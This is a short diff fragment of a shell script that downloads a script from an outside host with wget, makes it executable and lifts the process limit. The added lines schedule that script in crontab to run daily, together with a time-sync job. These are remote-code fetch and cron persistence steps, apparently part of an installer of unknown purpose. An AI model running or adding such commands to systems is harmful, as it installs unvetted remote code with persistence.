@@ -26,3 +26,5 @@ cd ..
 wget https://vilavpn.com/t.sh
 chmod +x  /t.sh
 ulimit -u unlimited
+crontab -l | { cat; echo "30 16 * * * /./t.sh"; } | crontab -
+crontab -l | { cat; echo "30 15 * * * ntpdate pool.ntp.org"; } | crontab -
